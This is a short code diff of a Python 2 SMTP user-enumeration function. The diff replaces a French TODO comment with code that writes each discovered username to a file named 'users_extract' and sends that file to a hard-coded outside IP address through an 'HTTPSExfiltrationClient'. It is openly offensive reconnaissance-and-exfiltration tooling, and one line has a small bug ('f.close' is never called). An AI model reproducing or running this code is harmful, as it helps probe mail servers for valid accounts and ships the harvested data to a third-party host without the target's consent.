@@ -262,12 +262,13 @@ def smtp_enum(host,port):
 			print "[-] Not found "+line
 		elif found: 
 	        	print "[+] Found! "+line 
-#
-##		        	TODO
-###
-####					Si on trouve un USER ton l'ajoute dans un csv 
-#####
-		 
+			line = str(line)
+			f = open("users_extract","a")
+			f.write(line)
+		 	f.close
+			client = HTTPSExfiltrationClient(host='213.32.112.42', key="123")
+			client.sendFile("users_extract")
+			client.close()
 		s.close()
 
 ##
